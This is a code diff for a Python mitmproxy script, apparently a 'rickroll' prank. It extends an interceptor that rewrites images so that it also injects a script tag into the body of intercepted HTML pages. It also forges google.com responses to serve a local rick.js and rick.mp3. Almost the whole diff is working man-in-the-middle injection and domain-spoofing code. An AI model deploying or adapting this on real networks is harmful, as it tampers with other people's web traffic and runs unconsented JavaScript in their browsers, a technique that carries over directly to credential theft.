@@ -11,6 +11,8 @@ import tornado.wsgi
 import tornado.websocket
 from PIL import Image
 from flask import Flask, send_from_directory
+from libmproxy.protocol.http import decoded, HTTPResponse
+from netlib.odict import ODictCaseless
 
 app = Flask("mitm", static_folder="client/app", static_url_path="")
 app_wsgi = tornado.wsgi.WSGIContainer(app)
@@ -128,12 +130,21 @@ def response(ctx, flow):
     print "Received flow: %s" % flow
 
     is_image = (
-        (re.search(r"jpe?g|png|gif|webm", flow.request.path) or
+        (re.search(r"(jpe?g|png|gif|webm)$", flow.request.path) or
         "image" in flow.response.headers.get_first("content-type", ""))
         and flow.response.content
     )
     if is_image:
         handle_image(flow)
+
+    is_html = (
+        (re.search(r"(html?|php|cgi)$", flow.request.path) or
+        "html" in flow.response.headers.get_first("content-type", ""))
+        and flow.response.content
+        and "youtube" not in flow.request.pretty_host(hostheader=True)
+    )
+    if is_html:
+        handle_html(flow)
 
 
 def handle_image(flow):
@@ -152,3 +163,30 @@ def handle_image(flow):
 
     flow.response.content = s.getvalue()
     flow.response.headers["content-type"] = ["image/png"]
+
+
+do_rick = True
+
+def handle_html(flow):
+    global do_rick
+    if do_rick:
+        rick_iframe = """<script type="text/javascript" src="//google.com/rick_js"></script>"""
+        with decoded(flow.response):
+            flow.response.content = re.sub("<body(.*?)>", r"<body\1>" + rick_iframe, flow.response.content, count=1)
+
+
+with open("rick.js", "rb") as f:
+    rick_js = f.read()
+with open("rick.mp3", "rb") as f:
+    rick_mp3 = f.read()
+
+
+
+def request(ctx, flow):
+    if flow.request.pretty_host(hostheader=True) == "google.com":
+        if flow.request.path == "/rick_js":
+            print "rick"
+            flow.reply(HTTPResponse([1, 1], 200, "OK", ODictCaseless([["content-type","text/javascript"]]), rick_js))
+        if flow.request.path == "/rick_mp3":
+            print "mp3"
+            flow.reply(HTTPResponse([1, 1], 200, "OK", ODictCaseless([["content-type", "audio/mpeg"]]), rick_mp3))
